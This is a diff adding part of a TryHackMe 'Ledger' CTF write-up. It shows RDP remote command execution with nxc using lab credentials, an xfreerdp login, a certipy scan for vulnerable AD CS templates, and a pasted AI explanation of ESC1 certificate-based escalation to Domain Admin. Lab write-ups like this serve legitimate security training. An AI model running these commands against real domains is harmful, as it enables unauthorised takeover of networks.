@@ -449,4 +449,87 @@ SMB         10.130.181.194  445    LABYRINTH        NETLOGON        READ        
 SMB         10.130.181.194  445    LABYRINTH        SYSVOL          READ            Logon server share 
 ```
 
-> Looks like we have read permission over SYSVOL share, which is a huge security risk. Let's read its contents.
+> Looks like we have read permission over SYSVOL share, which is a huge security risk. Let's read its contents. Unfortunately, I could not find something VERY useful for pwnage.
+
+> RDP Port is open, let's test:
+
+```shell
+┌──(root㉿kali)-[~/thm.local]
+└─# nxc rdp ledger.thm -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -x 'whoami'
+[!] Executing remote command via RDP will disconnect the Windows session (not log off) if the targeted user is connected via RDP, do you want to continue ? [Y/n] y
+RDP         10.130.181.194  3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
+RDP         10.130.181.194  3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! (Pwn3d!)
+RDP         10.130.181.194  3389   LABYRINTH        [+] Executing command: whoami with delay 5 seconds
+RDP         10.130.181.194  3389   LABYRINTH        [+] Waiting for clipboard to be ready...
+RDP         10.130.181.194  3389   LABYRINTH        thm\susanna_mcknight
+```
+
+> Okay, looks like we can actually use this.
+
+> RDP: First flag.
+
+```shell
+xfreerdp /v:ledger.thm /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /dynamic-resolution
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Ledger/Images/Screenshot%20From%202026-07-30%2022-47-30.png)
+
+---
+
+## Privilege Escalation
+
+> With a hint, I found out that we should be looking for a certificate misconfiguration. I am not an Active Directory nerd, so I asked AI for help, and explanation for this privilege escalation vector.
+
+```shell
+certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.130.181.194 -target thm.local -vulnerable -enabled
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 14 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 21 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
+[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
+[*] Saving text output to '20260730145459_Certipy.txt'
+[*] Wrote text output to '20260730145459_Certipy.txt'
+[*] Saving JSON output to '20260730145459_Certipy.json'
+[*] Wrote JSON output to '20260730145459_Certipy.json'
+```
+
+> Simple Explanation; From what I understand, AD CS (Active Directory Certificate Services) is like the Passport Office, where users can login to Active Directory by showing Digital Certificates instead of entering password every single time. Since we can request a certificate in behalf of someone else (Like a more privileged user: Administrator) as a low-privileged user, this can be turned into a privilege escalation vector.
+
+> AI Explanation: 
+Breaking down the command in plain English:
+
+    -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!': You provided normal, low-level user credentials to log in.
+
+    find: You asked Certipy to scan the domain’s Certificate Authority (the passport office) and list all the rules it uses.
+
+    -enabled: "Only show me rules (templates) that are currently active."
+
+    -vulnerable: "Filter out the safe stuff—only highlight configurations that have known security flaws."
+Why Did We Do It?
+
+In Windows networks, administrators create Certificate Templates (think of them like pre-printed application forms for different types of badges—e.g., "Web Server Badge", "Standard User Badge", "VPN Access Badge").
+
+Because AD CS is complex, system administrators frequently make mistakes when setting up these application forms. For example, they might accidentally leave a box checked that says:
+
+    "Allow the applicant to type whatever name they want on the badge, and issue it without approval."
+
+If Certipy finds a vulnerable template (such as a flaw known as ESC1):
+
+    Ask for an ID Badge: As a normal user (SUSANNA_MCKNIGHT), we fill out the vulnerable application form.
+
+    Impersonate the Boss: Because of the misconfiguration, we write Administrator in the "Name on Badge" field.
+
+    Get Approved: The Certificate Authority signs it and hands us a valid digital certificate that says we are the Domain Administrator.
+
+    Log In as Administrator: We present this certificate to the domain to authenticate. The network trusts the certificate completely, handing us full Domain Admin (Root) control over every computer in the domain.
+
+Certipy created a text file (20260730145459_Certipy.txt) containing the scan results. The next step is to open that file to see which specific template is vulnerable so we can request our administrator certificate.
